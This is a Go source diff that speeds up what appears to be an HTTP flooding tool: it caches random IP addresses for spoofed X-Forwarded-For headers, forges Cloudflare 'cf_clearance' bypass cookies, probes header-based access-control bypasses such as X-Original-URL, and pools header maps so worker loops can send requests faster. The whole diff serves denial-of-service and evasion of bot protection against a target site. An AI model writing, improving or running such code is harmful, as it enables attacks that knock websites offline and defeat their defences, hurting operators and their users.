@@ -4,7 +4,6 @@ import (
 	"bufio"
 	"context"
 	"crypto/tls"
-	cryptorand "crypto/rand"
 	"encoding/hex"
 	"fmt"
 	"io"
@@ -155,12 +154,20 @@ var headerPool = sync.Pool{
 	},
 }
 
+var headerMapPool = sync.Pool{
+	New: func() interface{} {
+		return make(http.Header)
+	},
+}
+
 type headerItem struct{ key, value string }
 
 var (
 	randStringPool []string
 	randIntPool    []int64
 	randIndex      uint64
+	randomIPs      []string
+	ipIndex        uint64
 )
 
 func init() {
@@ -172,6 +179,10 @@ func init() {
 	randIntPool = make([]int64, POOL_SIZE)
 	for i := 0; i < POOL_SIZE; i++ {
 		randIntPool[i] = rng.Int63()
+	}
+	randomIPs = make([]string, 1024)
+	for i := 0; i < 1024; i++ {
+		randomIPs[i] = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 	}
 }
 
@@ -185,8 +196,9 @@ func getRandInt() int64 {
 	return randIntPool[idx]
 }
 
-func randIP(rng *rand.Rand) string {
-	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+func getRandIP() string {
+	idx := atomic.AddUint64(&ipIndex, 1) % uint64(len(randomIPs))
+	return randomIPs[idx]
 }
 
 func randStr(rng *rand.Rand, n int) string {
@@ -200,15 +212,15 @@ func randStr(rng *rand.Rand, n int) string {
 
 func randHex(n int) string {
 	b := make([]byte, n)
-	if _, err := cryptorand.Read(b); err != nil {
-		return randStr(rand.New(rand.NewSource(time.Now().UnixNano())), n*2)[:n]
+	if _, err := io.ReadFull(rand.New(rand.NewSource(time.Now().UnixNano())), b); err != nil {
+		return getRandString()[:n]
 	}
 	return hex.EncodeToString(b)[:n]
 }
 
 func generateBypassCookie() string {
 	ts := time.Now().Unix()
-	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", randHex(22), ts, randHex(6))
+	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", getRandString()+getRandString(), ts, getRandString()[:6])
 }
 
 func probeCertificate(host string) bool {
@@ -322,8 +334,7 @@ func BypassHeaderBypass(target, proxyIP string) map[string]bool {
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	if proxyIP == "" {
-		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-		proxyIP = randIP(rng)
+		proxyIP = getRandIP()
 	}
 	headers := []string{
 		"X-Original-URL",
@@ -719,7 +730,7 @@ func main() {
 	startTime := time.Now()
 	ctx, cancel := context.WithCancel(context.Background())
 	go func() {
-		ticker := time.NewTicker(1 * time.Second)
+		ticker := time.NewTicker(5 * time.Second)
 		defer ticker.Stop()
 		for {
 			select {
@@ -987,7 +998,7 @@ func main() {
 				headers = append(headers, headerItem{"If-None-Match", `"` + getRandString() + `"`})
 				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
 				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
-				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + randIP(rng)})
+				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + getRandIP()})
 				headers = append(headers, headerItem{"X-Originating-IP", realIP})
 				headers = append(headers, headerItem{"X-Remote-IP", realIP})
 				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
@@ -997,10 +1008,14 @@ func main() {
 					headers[i], headers[j] = headers[j], headers[i]
 				})
 
-				req.Header = make(http.Header)
-				for _, h := range headers {
-					req.Header.Add(h.key, h.value)
+				headerMap := headerMapPool.Get().(http.Header)
+				for k := range headerMap {
+					delete(headerMap, k)
 				}
+				for _, h := range headers {
+					headerMap.Add(h.key, h.value)
+				}
+				req.Header = headerMap
 
 				resp, err := cli.client.Do(req)
 				if err == nil {
@@ -1011,6 +1026,7 @@ func main() {
 					atomic.AddInt64(&totalErrors, 1)
 				}
 
+				headerMapPool.Put(headerMap)
 				headerPool.Put(headers)
 			}
 		}(cw, w)
